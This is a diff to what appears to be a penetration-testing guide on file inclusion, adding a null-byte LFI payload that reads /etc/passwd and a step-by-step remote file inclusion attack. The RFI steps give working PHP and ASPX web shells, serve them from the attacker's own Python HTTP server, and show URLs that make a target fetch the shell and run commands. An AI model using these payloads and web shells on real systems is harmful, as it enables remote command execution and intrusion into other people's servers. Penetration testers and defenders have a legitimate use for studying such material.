@@ -242,6 +242,21 @@ Local File Inclusion (LFI) vulnerabilities allow attackers to include files from
 - Look for log poisoning opportunities (e.g., `/var/log/apache2/access.log`).
 - Combine with Path Traversal for maximum effect.
 
+### NULL BYTE (%00) Injection
+
+A NULL byte (`%00`) is a special character that represents the end of a string in C-based languages, including older versions of PHP. Attackers use it to terminate a file path early, bypassing file extension restrictions or filters applied by the web application.
+
+**Why use it?**
+- In older PHP versions (before 5.3.4), appending `%00` to a file path can trick the server into ignoring any forced file extension (e.g., `.php`) added by the application.
+- This allows inclusion of files like `/etc/passwd` even if the application tries to append `.php` (e.g., `include($_GET['page'] . '.php')`).
+
+**Example Payload:**
+```
+?page=../../../../etc/passwd%00
+```
+
+> **Note:** Modern PHP versions have patched this vulnerability, but it may still be effective on legacy systems.
+
 ---
 
 ### Remote File Inclusion (RFI)
@@ -260,7 +275,58 @@ Remote File Inclusion (RFI) vulnerabilities allow attackers to include and execu
 - Host a simple web shell or PHP info file on your server for testing.
 - RFI can sometimes be combined with LFI for advanced attacks (e.g., log file injection).
 
----
+**Example: Hosting a Malicious File for RFI Testing (Linux & Windows)**
+
+#### For Linux Targets (PHP Web Shell)
+1. Create a simple PHP web shell (e.g., `shell.txt`):
+    ```php
+    <?php system($_GET['cmd']); ?>
+    ```
+2. Start a Python HTTP server in the directory containing `shell.txt`:
+    ```bash
+    python3 -m http.server 9000
+    ```
+3. Use the following RFI payload to include your remote file:
+    ```
+    ?page=http://<your-ip>:9000/shell.txt
+    ```
+4. To execute a command (e.g., `id`), visit:
+    ```
+    http://target-victim/page.php?page=http://<your-ip>:9000/shell.txt&cmd=id
+    ```
+
+#### For Windows Targets (ASPX Web Shell)
+1. Create a simple ASPX web shell (e.g., `shell.aspx`):
+    ```aspx
+    <%@ Page Language="C#" %>
+    <script runat="server">
+    void Page_Load(object sender, EventArgs e) {
+        if (Request["cmd"] != null) {
+            System.Diagnostics.Process proc = new System.Diagnostics.Process();
+            proc.StartInfo.FileName = "cmd.exe";
+            proc.StartInfo.Arguments = "/c " + Request["cmd"];
+            proc.StartInfo.UseShellExecute = false;
+            proc.StartInfo.RedirectStandardOutput = true;
+            proc.Start();
+            Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
+        }
+    }
+    </script>
+    ```
+2. Start a Python HTTP server in the directory containing `shell.aspx`:
+    ```bash
+    python3 -m http.server 9000
+    ```
+3. Use the following RFI payload to include your remote file:
+    ```
+    ?page=http://<your-ip>:9000/shell.aspx
+    ```
+4. To execute a command (e.g., `whoami`), visit:
+    ```
+    http://target-victim/page.aspx?page=http://<your-ip>:9000/shell.aspx&cmd=whoami
+    ```
+
+> **Note:** Replace `<your-ip>` with your actual IP address accessible by the target. Make sure the target web application supports remote file inclusion and the relevant scripting language (PHP for Linux, ASPX for Windows).
 
 ---
 
